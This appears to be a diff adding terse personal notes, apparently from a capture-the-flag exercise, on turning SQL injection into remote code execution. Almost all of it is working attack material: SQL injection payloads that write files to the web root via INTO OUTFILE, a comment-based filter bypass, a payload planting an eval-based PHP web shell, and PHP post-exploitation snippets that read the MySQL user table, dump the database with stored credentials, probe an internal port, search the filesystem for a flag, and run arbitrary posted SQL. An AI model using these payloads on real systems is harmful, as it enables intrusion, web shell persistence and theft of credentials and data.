@@ -1,0 +1,79 @@
+https://security.stackexchange.com/questions/77039/can-sql-injection-lead-to-remote-code-execution
+
+replace space with /**/ to avoid replacement.
+
+```
+' OR 1=1 INTO OUTFILE "\/var\/www\/html\/exploit_0.txt"#
+```
+
+' UNION ALL (SELECT "hello",1 INTO OUTFILE "/var/www/html/exploit_0.txt")#
+' SELECT * FROM users INTO OUTFILE "\/var\/www\/html\/exploit_0.txt"#
+
+
+The point is, 3 columns, use column separator as tab LOL
+'/**/UNION/**/SELECT/**/"<?php","","phpinfo();"/**/FROM/**/users/**/INTO/**/OUTFILE/**/"\/var\/www\/html\/phpinfo.php"#
+
+Shell:
+'/**/UNION/**/SELECT/**/"<?php","@eval($_POST['shell']);","?>"/**/FROM/**/users/**/INTO/**/OUTFILE/**/"\/var\/www\/html\/shell.php"#
+
+```
+require_once("config.php");
+$sql='SELECT * FROM mysql.user LIMIT 0,1;';
+$result = $mysqli->query($sql);
+$row = $result->fetch_array();
+print_r($row);
+```
+
+```
+$curl = curl_init();
+curl_setopt($curl, CURLOPT_URL, "http://127.0.0.1:55418");
+curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
+$response = curl_exec($curl);
+curl_close($curl);
+echo $response;
+```
+
+```
+echo file_get_contents("/flag");
+```
+
+```
+$dir="/var/www/html";
+var_dump(scandir($dir));
+```
+
+```
+require_once("config.php");
+$dir = dirname(__FILE__) . '/dump.sql';
+exec("mysqldump --user={$dbuser} --password={$dbpass} --host={$hostname} {$database} --result-file={$dir} 2>&1", $output);
+var_dump($output);
+```
+
+```
+$file_to_search = "flag";
+search_file('/',$file_to_search);
+function search_file($dir,$file_to_search){
+$files = scandir($dir);
+foreach($files as $key => $value){
+    $path = realpath($dir.DIRECTORY_SEPARATOR.$value);
+    if(!is_dir($path)) {
+        if($file_to_search == $value){
+            echo "file found<br>";
+            echo $path;
+            break;
+        }
+    } else if($value != "." && $value != "..") {
+        search_file($path, $file_to_search);
+    }  
+ } 
+}
+```
+
+```
+require_once("config.php");
+var_dump($mysqli->query($_POST['q'])->fetch_all(MYSQLI_ASSOC));
+```
+with query
+```
+SELECT * FROM flagg.flag;
+```
